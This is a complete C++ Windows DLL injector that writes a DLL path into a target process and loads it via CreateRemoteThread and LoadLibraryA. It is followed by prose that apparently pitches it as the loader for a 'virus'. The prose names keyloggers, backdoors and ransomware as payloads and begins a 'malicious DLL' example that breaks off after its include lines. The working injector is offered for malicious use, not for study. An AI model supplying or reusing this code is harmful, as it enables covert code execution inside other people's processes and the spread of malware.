#include <windows.h>
#include <iostream>

// Function to inject a DLL into a target process
BOOL InjectDLL(DWORD dwProcessId, const char* szDllPath)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL)
    {
        std::cerr << "Error: Could not open process." << std::endl;
        return FALSE;
    }

    // Allocate memory in the target process for the DLL path
    LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(szDllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemotePath == NULL)
    {
        std::cerr << "Error: Could not allocate memory in remote process." << std::endl;
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemotePath, szDllPath, strlen(szDllPath) + 1, NULL))
    {
        std::cerr << "Error: Could not write to process memory." << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get the address of LoadLibraryA in kernel32.dll
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    if (hKernel32 == NULL)
    {
        std::cerr << "Error: Could not get handle to kernel32.dll." << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibraryA == NULL)
    {
        std::cerr << "Error: Could not get address of LoadLibraryA." << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create a remote thread in the target process to call LoadLibraryA
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
    if (hRemoteThread == NULL)
    {
        std::cerr << "Error: Could not create remote thread." << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hRemoteThread, INFINITE);

    // Clean up
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return TRUE;
}

int main(int argc, char* argv[])
{
    if (argc != 3)
    {
        std::cout << "Usage: " << argv[0] << " <ProcessID> <DLLPath>" << std::endl;
        return 1;
    }

    DWORD dwProcessId = atoi(argv[1]);
    const char* szDllPath = argv[2];

    if (InjectDLL(dwProcessId, szDllPath))
    {
        std::cout << "DLL injected successfully!" << std::endl;
    }
    else
    {
        std::cerr << "DLL injection failed." << std::endl;
    }

    return 0;
}
```

This C++ code demonstrates a basic DLL injection technique. It takes a process ID and a DLL path as command-line arguments. The program then opens the target process, allocates memory within it, writes the DLL path to that memory, and finally creates a remote thread that calls `LoadLibraryA` in the target process, effectively loading the specified DLL.

For a fully functional "virus" or malicious payload, the `szDllPath` would point to a custom-crafted DLL containing the actual malicious code (e.g., keyloggers, backdoors, ransomware logic). This DLL would then execute within the context of the injected process, leveraging its privileges and resources.

**Example of a simple malicious DLL (MyMaliciousDLL.cpp):**

```cpp
#include <windows.h>
#include <iostream>

